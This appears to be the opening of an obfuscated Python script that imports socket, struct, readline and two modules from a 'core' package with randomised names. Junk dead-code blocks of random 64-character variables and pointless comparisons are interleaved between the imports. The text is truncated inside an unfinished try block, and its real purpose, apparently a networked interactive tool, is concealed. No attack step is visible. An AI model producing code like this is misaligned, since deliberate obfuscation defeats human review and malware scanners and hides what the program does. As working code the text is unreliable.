#!/usr/bin/env python
KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi = 'vBEtPsseowLigEyrIySHHbywyysHRlfHkXkDoFMvoVPNGApYTzyphnrHZrpshIIi'
uUYpUXATpOkLYDSkBTlcQyaQZaWCreSNGNlbScEMFCOkiJhWagNUhAHXCCkhvaEl = 'tZxYhXSWzmoOLecdbwxcPCqISHrZxCWYcXeVOfnWIcFYrozwrVNEzMTvAJKMQWyd'
gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm = 'ITCOCeJsixcwgnMtuUscYywwHTFuITScizJpEIxhclizSzLASFSZugGOKVHyFYlD'
WpxznudrxLcUCJGxUpuoguRhEcWQYSEwvZsfPMtwtYfnkguuYeMIgELSxQhaLNaM = 'DxgQbnpkGrdtmzxFyONEarlRbRNlzFKBstVomDLZlkfopWlcmDRHRhlXkELTVHUG'
ZIeIESoblwbFFRMmWnDaAhGmMTsjoCLDCvBUMibiJgSEBhbyAdfdFwNWQtdoDhhU = 'vJFSvfPlqElJRgbkNmHePnQahgPeSdfVXnkhoomNYuXVrmeBeWQADySRgnLJNOsv'
hDFNosrYHfTgddfepnnTTnzZyfxpqVhoGBnIndTzRyBWvwqjIujVUzcgwGEbaAlZ = 'GYflkOJVwBzmOorpcfMlSZVHmEQFZCKQZsBcknEfjcYQCDaLrarFTnXBKKQhsuAS'
if KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi != WpxznudrxLcUCJGxUpuoguRhEcWQYSEwvZsfPMtwtYfnkguuYeMIgELSxQhaLNaM:
    uUYpUXATpOkLYDSkBTlcQyaQZaWCreSNGNlbScEMFCOkiJhWagNUhAHXCCkhvaEl = gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm
    for hDFNosrYHfTgddfepnnTTnzZyfxpqVhoGBnIndTzRyBWvwqjIujVUzcgwGEbaAlZ in WpxznudrxLcUCJGxUpuoguRhEcWQYSEwvZsfPMtwtYfnkguuYeMIgELSxQhaLNaM:
        if hDFNosrYHfTgddfepnnTTnzZyfxpqVhoGBnIndTzRyBWvwqjIujVUzcgwGEbaAlZ != gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm:
            uUYpUXATpOkLYDSkBTlcQyaQZaWCreSNGNlbScEMFCOkiJhWagNUhAHXCCkhvaEl = uUYpUXATpOkLYDSkBTlcQyaQZaWCreSNGNlbScEMFCOkiJhWagNUhAHXCCkhvaEl
        else:
            ZIeIESoblwbFFRMmWnDaAhGmMTsjoCLDCvBUMibiJgSEBhbyAdfdFwNWQtdoDhhU = KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi
else:
    gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm = KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi
    KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi = ZIeIESoblwbFFRMmWnDaAhGmMTsjoCLDCvBUMibiJgSEBhbyAdfdFwNWQtdoDhhU
    if gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm == KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi:
        for hDFNosrYHfTgddfepnnTTnzZyfxpqVhoGBnIndTzRyBWvwqjIujVUzcgwGEbaAlZ in KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi:
            if hDFNosrYHfTgddfepnnTTnzZyfxpqVhoGBnIndTzRyBWvwqjIujVUzcgwGEbaAlZ == gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm:
                gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm = KiVmpCNvPRjrFEsjUaozhpEIWZtVRwOhxxJALiskLfpEvPrXWgtXVoOeUODOnBfi
            else:
                gihjTIiQHxkFzHhsksoUVTUpRcvtxefQEOpgkaxBmTkescEhyZXELlsSlNHiLiAm = ZIeIESoblwbFFRMmWnDaAhGmMTsjoCLDCvBUMibiJgSEBhbyAdfdFwNWQtdoDhhU
# -*- coding: utf-8 -*-
import argparse
zHymAuzmveShikJlyqnmHdAHNKQvyNciQxGCiAcMdJMkLnApiClKmmtyhdpqfnLt = 'KSTgBZRSFhpvAQwlvpidGodjkvmtwghpyqaCHwYHiCPeyuffVgEtylRWQnLqidWo'
adrcyEFzCXexQPsxdpnGFyqWMTkbBEKtjoIwzMkFytSSCEqPXfpxjexhbzHLnZzr = 'bHTEuSgYSUbmrfxHewmBwEpPTkUcxNbJwmUOWopCLSXbShoUpOURnyLSCmcbXvSY'
if zHymAuzmveShikJlyqnmHdAHNKQvyNciQxGCiAcMdJMkLnApiClKmmtyhdpqfnLt != adrcyEFzCXexQPsxdpnGFyqWMTkbBEKtjoIwzMkFytSSCEqPXfpxjexhbzHLnZzr:
    YGXqjVxpOoMoSkgTibTterJBInLzLXUebuMvNybxLfCnTOvdDVHkaHRThYrdKcFL = 'NiYdcPrtdsrNCOWZXmdClRbNJKSnHVsqOfCgmbMOEZmEivGBmuIzmyzpkhjncygS'
    FtghokLUERAtSlKpnNRFGyFuWLNmoyumtqlmTkPFbiTiAmXccMvJpAesnmKlQESC = 'aHmjuiAwdNrPqGGSEkElJxWorxiILkOWRjywrmwqSDXzBubLlujfqmwaheatFANR'
    FtghokLUERAtSlKpnNRFGyFuWLNmoyumtqlmTkPFbiTiAmXccMvJpAesnmKlQESC = YGXqjVxpOoMoSkgTibTterJBInLzLXUebuMvNybxLfCnTOvdDVHkaHRThYrdKcFL
import readline
vbjUkTTBIXEcChZjImDatXAcisXvhculbVtoklSSCtuulVfBFtwextizeUardGwl = 'rZCRNinNDtCIQfaOJGayFITqqXwriubUZAzKSgDdLddCmgzOISffojfbJnYkVAmP'
ihctcxLvzYVCOAVtDMdfOBdqkRGliuQynTFNgiNmijVYJeTDxtaCZPudZLwysHQZ = 'iYosvbJbGGUcTIwZRcpYzANyQeVzTNqyjjMZpgpUvoEAvxpkJznNGjSsaGMJXIlY'
if vbjUkTTBIXEcChZjImDatXAcisXvhculbVtoklSSCtuulVfBFtwextizeUardGwl != ihctcxLvzYVCOAVtDMdfOBdqkRGliuQynTFNgiNmijVYJeTDxtaCZPudZLwysHQZ:
    NiGDiTDDaMBeAuMsqWRzVYMChvAwVdWVUSbvMdazqRwKLEqZVBxogKhifbIoWhhZ = 'qeskVHzsndaJYuEYVzNBCXYnLHjyfvIvzGqqXeueqqhnVxMZdUQQLbtJdOzCdFIr'
    dWBxGdqAMYEMvolGRwsCqOevDOPzepyIsUJgNgGVtlZIAkHrdVwTUBcIXVozjMGk = 'VMTmMBEHKFrNKeymYMdEUWmSLDtvRtMsniTdQiuUUcTfQrVILvcjZBUzLFdTbidk'
    dWBxGdqAMYEMvolGRwsCqOevDOPzepyIsUJgNgGVtlZIAkHrdVwTUBcIXVozjMGk = NiGDiTDDaMBeAuMsqWRzVYMChvAwVdWVUSbvMdazqRwKLEqZVBxogKhifbIoWhhZ
import socket
wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN = 'bmlrhElcqHsJrUDfnwDNjWkTjbimYVVrIJKvAVleEFLtmlLLnlPYoIarYgMaAQdT'
qsTMtovuhamcEcZXUFEWlyDZcjXfWHvdESWsYbmOTDAuVjRbzlJhVcEldAAiNYbp = 'JiYPkjmtGLvbiEKDztoXBUyvfMLLZLWBfVhQEwcnMWyqReWUyLJZzHyBFDsMokfr'
rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT = 'GdwlqLmepjMnVefjnjTUYooPyuoaOHbyMBvRWICxmudJMJDrRixyFANdTGEvrgvW'
vyOfktSuNxjIHqaKVXGOrDztxsrzZMIfhGaoSCeBMXzJfPDEcjhFXLOVVoEsDagE = 'tzclXKRUnIvCXAHaLpMzzWelMaChgRUBowZvdmLEVoNRIKQNfMMLgDRJvqFCOYvz'
OfjHGgQhcjPvniwUhTnSGZgdzbwsqYIpFDXRJAQzdQDhcoRgoHAAAhRrjVyorMzC = 'tBaYRRrfLXPphbVzlWvzVTwglhRuYKckZsytPEOGXKoICFwqOpqKciUMErtxUaPg'
iyomQToXkDOGTOsUErUibeTAWPeXgNLetiZZdUxKRecBgUHZIFyCJfjXRRbNstsq = 'hxWBKyvHRjHkJnItHJeArxmKwWrcWuuaqvZYriMvbxdHFuPbYxTcVysoGchIqkjH'
if wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN != vyOfktSuNxjIHqaKVXGOrDztxsrzZMIfhGaoSCeBMXzJfPDEcjhFXLOVVoEsDagE:
    qsTMtovuhamcEcZXUFEWlyDZcjXfWHvdESWsYbmOTDAuVjRbzlJhVcEldAAiNYbp = rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT
    for iyomQToXkDOGTOsUErUibeTAWPeXgNLetiZZdUxKRecBgUHZIFyCJfjXRRbNstsq in vyOfktSuNxjIHqaKVXGOrDztxsrzZMIfhGaoSCeBMXzJfPDEcjhFXLOVVoEsDagE:
        if iyomQToXkDOGTOsUErUibeTAWPeXgNLetiZZdUxKRecBgUHZIFyCJfjXRRbNstsq != rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT:
            qsTMtovuhamcEcZXUFEWlyDZcjXfWHvdESWsYbmOTDAuVjRbzlJhVcEldAAiNYbp = qsTMtovuhamcEcZXUFEWlyDZcjXfWHvdESWsYbmOTDAuVjRbzlJhVcEldAAiNYbp
        else:
            OfjHGgQhcjPvniwUhTnSGZgdzbwsqYIpFDXRJAQzdQDhcoRgoHAAAhRrjVyorMzC = wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN
else:
    rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT = wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN
    wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN = OfjHGgQhcjPvniwUhTnSGZgdzbwsqYIpFDXRJAQzdQDhcoRgoHAAAhRrjVyorMzC
    if rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT == wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN:
        for iyomQToXkDOGTOsUErUibeTAWPeXgNLetiZZdUxKRecBgUHZIFyCJfjXRRbNstsq in wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN:
            if iyomQToXkDOGTOsUErUibeTAWPeXgNLetiZZdUxKRecBgUHZIFyCJfjXRRbNstsq == rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT:
                rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT = wFfjHtpVjiAEgUkgKOETJYxTrebSIZHXgApRLwcfQydoBBmdyqlfDjsMXxzwLkMN
            else:
                rqxeGyprddeamJIUuNiOfYpDvOpObjqLjPrBNqIyWQHkXhObHKjLEJDqVeiRRQLT = OfjHGgQhcjPvniwUhTnSGZgdzbwsqYIpFDXRJAQzdQDhcoRgoHAAAhRrjVyorMzC
import struct
qsqaqCsXSVDgdptRVcJEbdZBlwbskkOslShMozJvbfoVrxucNihJfjUohNpkZGhG = 'KjAlgvLCOsvzZgKtSudVdcsfoGKYcSIkaIGBBbCOgCeGfnKFKxmTqTRUbZDwrJSG'
NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq = 'lqKNYLFkIxOsJZvqKzvakCaRqPBnyzULiePVZLTvamYpKRYbovajtJIfmkeGDulO'
EbeYjOhzPGqBSJktPDkieXGNOypkDdkOJOmIglmkbmTrTOsCFLzfTcTggMTJsdvl = 'TaJDtcfDcnPxkTpBKvdxsgHydikYkVqgebdxyogtnmzXKjGdkLqZrQCgSaJaUZaW'
OnoKzJotmnqqpieQBtuQLJZmqdsMGZitLRucHYnRKCOdPtFWkdhdHhkUtjELfOmO = 'IgnRUGjHRPSWzmkSlJTNXocKLOSueAOvJZUHQOFNJtIYUhYfbdfcsLFnzymOqNJt'
lwmNsDRebMNffCmAZuqkJkEtNLxtEzUrlqsnzHAdthuJcZnEVTZWSYsmxNSYPrOz = 'UTnglXTMelAiJxAYqrFpvglnYhqCiLfhZjFkExVmPggRxmerEEDooBKUcoMttYQs'
if qsqaqCsXSVDgdptRVcJEbdZBlwbskkOslShMozJvbfoVrxucNihJfjUohNpkZGhG in NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq:
    qsqaqCsXSVDgdptRVcJEbdZBlwbskkOslShMozJvbfoVrxucNihJfjUohNpkZGhG = lwmNsDRebMNffCmAZuqkJkEtNLxtEzUrlqsnzHAdthuJcZnEVTZWSYsmxNSYPrOz
    if NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq in EbeYjOhzPGqBSJktPDkieXGNOypkDdkOJOmIglmkbmTrTOsCFLzfTcTggMTJsdvl:
        NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq = OnoKzJotmnqqpieQBtuQLJZmqdsMGZitLRucHYnRKCOdPtFWkdhdHhkUtjELfOmO
elif NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq in qsqaqCsXSVDgdptRVcJEbdZBlwbskkOslShMozJvbfoVrxucNihJfjUohNpkZGhG:
    EbeYjOhzPGqBSJktPDkieXGNOypkDdkOJOmIglmkbmTrTOsCFLzfTcTggMTJsdvl = NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq
    if EbeYjOhzPGqBSJktPDkieXGNOypkDdkOJOmIglmkbmTrTOsCFLzfTcTggMTJsdvl in NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq:
        NwaNdDYrQvnDyJLmFLYsSliREmdTTUWUehnEgRUMSuCtiHlrUUMTOwdXazXSZAVq = lwmNsDRebMNffCmAZuqkJkEtNLxtEzUrlqsnzHAdthuJcZnEVTZWSYsmxNSYPrOz
import sys
ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn = 'FzaAWIJeRCXrUmYBQSzJeuTcGXfDqIGXAEfEpngsxxDlRpPjTVVIXBsdDfAEESTn'
HxtewcRGydSEWXHFWKvaVATDgneZxephQKhiJFBXlvPOmRrdGmkIRsBlnRMLKwBJ = 'MoDNJZCUHvgurRTMjbrVakqkKSLOytYkGrtjIHwBiUlDZIbZBmaUfYktZczAnrif'
XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT = 'wdkcOXUEsrAJuhkvsALHBTfwnFIwdVnjWWSfBdKCoCJWXGdErZIPYHFIXmFrxFGr'
psvMHcYGUSqRJfOixWkCCVALVlpcNVjdkQbLCgbfQSXwPLedSNkffmWdMIfpLFhw = 'qzLAThyXoPaJfRNXZdRFhQjwXMkBMAjihjTMNxblSfKQbteojUwdwvMoJTvCVtig'
hWVDKoGNiUpxAoXzkiTvkTloclXTgWRXRxWDFToyEirqdRArgADoUQyMhvHVkCDf = 'XHQNjVOSJZjfRbnYMCONifDhllsFdfhqhhnFohigefyzUqgDEnKzpXsjrrbPlNEP'
wyeHLFGCZCsklxlEssiFrofGJWZsoxRTWmwpigcNDYIoyASkHPyrFYhyPNUjIkOR = 'vecTGjEDuPKqxLTmQSECsSqgOyKfrispTMvRTXUftoqAapcjYuiInQGOmWPmasTc'
if ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn != psvMHcYGUSqRJfOixWkCCVALVlpcNVjdkQbLCgbfQSXwPLedSNkffmWdMIfpLFhw:
    HxtewcRGydSEWXHFWKvaVATDgneZxephQKhiJFBXlvPOmRrdGmkIRsBlnRMLKwBJ = XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT
    for wyeHLFGCZCsklxlEssiFrofGJWZsoxRTWmwpigcNDYIoyASkHPyrFYhyPNUjIkOR in psvMHcYGUSqRJfOixWkCCVALVlpcNVjdkQbLCgbfQSXwPLedSNkffmWdMIfpLFhw:
        if wyeHLFGCZCsklxlEssiFrofGJWZsoxRTWmwpigcNDYIoyASkHPyrFYhyPNUjIkOR != XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT:
            HxtewcRGydSEWXHFWKvaVATDgneZxephQKhiJFBXlvPOmRrdGmkIRsBlnRMLKwBJ = HxtewcRGydSEWXHFWKvaVATDgneZxephQKhiJFBXlvPOmRrdGmkIRsBlnRMLKwBJ
        else:
            hWVDKoGNiUpxAoXzkiTvkTloclXTgWRXRxWDFToyEirqdRArgADoUQyMhvHVkCDf = ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn
else:
    XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT = ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn
    ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn = hWVDKoGNiUpxAoXzkiTvkTloclXTgWRXRxWDFToyEirqdRArgADoUQyMhvHVkCDf
    if XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT == ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn:
        for wyeHLFGCZCsklxlEssiFrofGJWZsoxRTWmwpigcNDYIoyASkHPyrFYhyPNUjIkOR in ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn:
            if wyeHLFGCZCsklxlEssiFrofGJWZsoxRTWmwpigcNDYIoyASkHPyrFYhyPNUjIkOR == XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT:
                XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT = ojdTqDCbMojvqTNGrzbsBfWzfEFXkYfKlguWWPeGcFINYMPBRxTojVkDiluUdkAn
            else:
                XuFGVEujFzWinMxRQzEiQtHQGZUNzStQtGVNyyBkxMQevuckPVDVCmgNxVGzFpDT = hWVDKoGNiUpxAoXzkiTvkTloclXTgWRXRxWDFToyEirqdRArgADoUQyMhvHVkCDf
import time
hJWFlJAJkrJnmxCymhAGjtkfrMTUGwDvveJPbAqvsMWEtoRcStpwmVOiKeZNcVDW = 'lJeImOqZRCoKFcGFdEYevXFUChxSPOWNyyfkRDJDdgtEJjzbPGPqiWnufBFfPFRn'
BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU = 'icqKAHTwwSyjusGUOTUbbyaDdSaDdcxALZJWwMsHXtBVrJkVaQVEBcfECeojIylV'
awPYVaFzYQcAfAwccxVqIVVMUoSJtvGIpdZWuGNrOQqbJyEYzoTpyQDKEJxYvIDH = 'zdGlSzMWVUYnZxmNivcomiWQWuVMiKpjANsCGaANULRikMzsNtpMBbOzyTorLSgv'
eHqCnerYLlHxVIjPoQkLFJDHtnAZIWBFdUmwuBHzujNcjnYVZDMAXQsRdwGZBiEk = 'YAFjmNtSSVGBJSGScJDIkEtbXHSwYItYWMkALubLlTwoSnDXqyLTbAUzhaSmylMc'
EhJeHTOHyTXmZTFfilwfGjaJwmfnJojbXvEVHLTWEVMOyQWVtwvEbbZtIrihJhIg = 'faYsgPPoVktTKkYdlgzqkvYhBikWamiHlMfnMrESPLgyCGtvdfpBoaTeCdFmmyPU'
if hJWFlJAJkrJnmxCymhAGjtkfrMTUGwDvveJPbAqvsMWEtoRcStpwmVOiKeZNcVDW in BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU:
    hJWFlJAJkrJnmxCymhAGjtkfrMTUGwDvveJPbAqvsMWEtoRcStpwmVOiKeZNcVDW = EhJeHTOHyTXmZTFfilwfGjaJwmfnJojbXvEVHLTWEVMOyQWVtwvEbbZtIrihJhIg
    if BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU in awPYVaFzYQcAfAwccxVqIVVMUoSJtvGIpdZWuGNrOQqbJyEYzoTpyQDKEJxYvIDH:
        BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU = eHqCnerYLlHxVIjPoQkLFJDHtnAZIWBFdUmwuBHzujNcjnYVZDMAXQsRdwGZBiEk
elif BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU in hJWFlJAJkrJnmxCymhAGjtkfrMTUGwDvveJPbAqvsMWEtoRcStpwmVOiKeZNcVDW:
    awPYVaFzYQcAfAwccxVqIVVMUoSJtvGIpdZWuGNrOQqbJyEYzoTpyQDKEJxYvIDH = BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU
    if awPYVaFzYQcAfAwccxVqIVVMUoSJtvGIpdZWuGNrOQqbJyEYzoTpyQDKEJxYvIDH in BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU:
        BUzPqOsHOTMoAKfirwhHQCZnXWyoPlecbFwzahsNfGLfOLRmfMhDazBWUexhOYOU = EhJeHTOHyTXmZTFfilwfGjaJwmfnJojbXvEVHLTWEVMOyQWVtwvEbbZtIrihJhIg
try:
    iYEhNzikDnWLbKwoxbylcgqAqeYtCsUlDXvYuaXcOwjvgTCctbOTbtZAgHdMIFUW = 'dfLDyCoksOPYAovpTjhLSIIxnFKwgktYhQHqWTNNbVOztcCgmHWntiuTewrZfulA'
    nIXjqQwEMpIZYlOLpXSftcpDHWhvYiVOfnQztPPjIInyTnFxcIAbhJBNjldZNNJM = 'GNZznWbXoDXCKMiOqzSBzGBCLPyUAQdlWVTHPlBkKqQdpCwrMNVAznXRVtRmlcLV'
    SYQOWMOZUotuXuzBiSQegbaWObRfzmvvZdNQsUJaQPzDDpUePfUxbwBtRbVwsANM = 'avWQwYckFTQkfqPrGeeioPrLuXJPEhJZCfVEAKpbSpCCMrolvwfGCNgTeUtMUDCh'
    AxMTLrshkXJhrcnMMGytqvrSRtFjuheediZWROtILhaKNWusGRJuHfcnnTErVRcb = 'KkjfCKvcoscyIGVTuzNvhBorYLsdGCfobUzkJXmIQDiOvfnGdclqYRIyZbzWkQyl'
    SQOXxxMTJfFKjOMzaMCJqubnosSNtQwqIPFkQecfSnTzsRaruYFgwqAFRYLmIXfD = 'YVDPAYodVUziYcyKkwnUuGElghBIonGktfzcOmtFgDGBgSIDVMYcLDFZafOnqEQs'
    pkwwCKjkfDvukenzCajsOwkshRWuGJcBWUpvepqHMQzWWzoJmxQAmRtepKGJGKWh = 'hxyLUdUjEojaHUvBhBeRnxvQaTZnVPzAecAyVwybssuOsHSFoGwrrfzqzsPMQlZr'
    if SYQOWMOZUotuXuzBiSQegbaWObRfzmvvZdNQsUJaQPzDDpUePfUxbwBtRbVwsANM == AxMTLrshkXJhrcnMMGytqvrSRtFjuheediZWROtILhaKNWusGRJuHfcnnTErVRcb:
        for pkwwCKjkfDvukenzCajsOwkshRWuGJcBWUpvepqHMQzWWzoJmxQAmRtepKGJGKWh in SQOXxxMTJfFKjOMzaMCJqubnosSNtQwqIPFkQecfSnTzsRaruYFgwqAFRYLmIXfD:
            if pkwwCKjkfDvukenzCajsOwkshRWuGJcBWUpvepqHMQzWWzoJmxQAmRtepKGJGKWh == AxMTLrshkXJhrcnMMGytqvrSRtFjuheediZWROtILhaKNWusGRJuHfcnnTErVRcb:
                SQOXxxMTJfFKjOMzaMCJqubnosSNtQwqIPFkQecfSnTzsRaruYFgwqAFRYLmIXfD = iYEhNzikDnWLbKwoxbylcgqAqeYtCsUlDXvYuaXcOwjvgTCctbOTbtZAgHdMIFUW
            else:
                AxMTLrshkXJhrcnMMGytqvrSRtFjuheediZWROtILhaKNWusGRJuHfcnnTErVRcb = nIXjqQwEMpIZYlOLpXSftcpDHWhvYiVOfnQztPPjIInyTnFxcIAbhJBNjldZNNJM
    from core.VdhWHphnBOFufHFXmSdjHkrVcnvaRNwOEugsoiQWFfISinBvXleIxEynhpFPOLvF import gzbycLsDIoAAIdkKrPhXzOCBShxQOsZnySBSMqTNGnQftXQwITlzDOwUPzFObZoY,aRmegvZNDGuhCtVQAlakKtZRoZafnQqupvFkrdupYnNDQMdYpuVagixWOykbEOkE,ZnSlsMtPHuxZiZtdggZNNZbzlZGOKaVkpkTQLVelCtNuiCQWxtNSxMyhJZsAWbwr
    BansjCtHMRztPvxbSqyXWNkmVkkMZdRInMsHktlZWRszHUTckKtHTvjvYneKcIpz = 'LoDNywbOosQNJxsZMdjmVZObJjoXyVDUnEEmTwDtMYQSOHsSCKdDpbUajPaHNHKK'
    CpXCKkWceviTkHqZeUBWGAfuQwZAhoaTaipsWznaALNyXMpVeXmNDPDVieGVEvwp = 'MaunqOYTpdAvAAxIYJsQLJwrfnhGrEgVpqpmCMfEnZcfUSogBPJqkfHWHTamtQZH'
    if BansjCtHMRztPvxbSqyXWNkmVkkMZdRInMsHktlZWRszHUTckKtHTvjvYneKcIpz != CpXCKkWceviTkHqZeUBWGAfuQwZAhoaTaipsWznaALNyXMpVeXmNDPDVieGVEvwp:
        DvMmBHglsCGDioMpOAjKqFJhsCtSUtVgfFykHolVZBZqxlsXssMMJMqfhRyIFtLM = 'rWJSOpkzPVqaOODqjakDtkiCdxQTAftsjsamYRGhtDxaEKTMxGftOWyXYcwoNXSk'
        yobCaOnrdyXtKQgfEmnISXFEPtOJLvXVFYPiDScPpVJBSJOowgVWcMXkqKwNAvLO = 'LyddZGzWOOGPzCSvDbxxYFTJYFpyyaVrUrBwYsqtBJdLhnFtWihDloXHZReRJfuB'
        yobCaOnrdyXtKQgfEmnISXFEPtOJLvXVFYPiDScPpVJBSJOowgVWcMXkqKwNAvLO = DvMmBHglsCGDioMpOAjKqFJhsCtSUtVgfFykHolVZBZqxlsXssMMJMqfhRyIFtLM
    from core.CKTOXmRTSSqMVhXFpFrbrLPAbfrEpWaBapWDGDyngpfMmXVMSsQgAehNYVhjGKYK import FRoDRlsJIAlzmRsiLfnTwPbAAJhNPzLZiqmTHwMxrMnMNWnHWWCvyIklDxFOqKIe, gyEOxeZsdJwUGZYgHHjnAcyVnMSFdVEoTXtZeIXivuMhKxmmOUmZwswTamNUpaob
    hZrBcvmsEqVaTvHvcaMAiBEIIfCRMeboAPGfnhFLNclZqmTYOZSIQgAayrITyANT = 'ORzLhajQWdUWhgwOduhKHRviNUNgoUdRlxqwbJqpYsistgIkARIagcBXnLFjcRmc'
    bjYDoNWeUItMKPdBhULhPVNrSQHqWYKEKuvzdKKlizPIfThpfgiAEdWxnYZvoHlE = 'ctlFgMunDRUqgVMdfSvlAiJXrXuPLNsgTcHngwvRxMIEEFiETIhVsRNlkqFRGafJ'
    ljgZZFzfKRnTDNHAHRYzDbhyOLMVsHPpqBDwTRBOySqhAMMbvmzKtaVICaWpgiTH = 'fOWAREcrdiGfetTlPJmPuZyXZCOlCjQhLizgFxkEzNSmBAUBUdvtacuyKKgMloog'
    if hZrBcvmsEqVaTvHvcaMAiBEIIfCRMeboAPGfnhFLNclZqmTYOZSIQgAayrITyANT == bjYDoNWeUItMKPdBhULhPVNrSQHqWYKEKuvzdKKlizPIfThpfgiAEdWxnYZvoHlE:
        xeJkQbhItEtxLPboBtCUXGYvFBQxSWOnVLKKsnIOwPufLXNaqnpJbyaAgLEHlUwv = 'aNnphQMAOnOIJmufWbcKNLpiPHtesgqnPKqIKEuMyUyjTSbLyNuwODiazGvQjTHP'
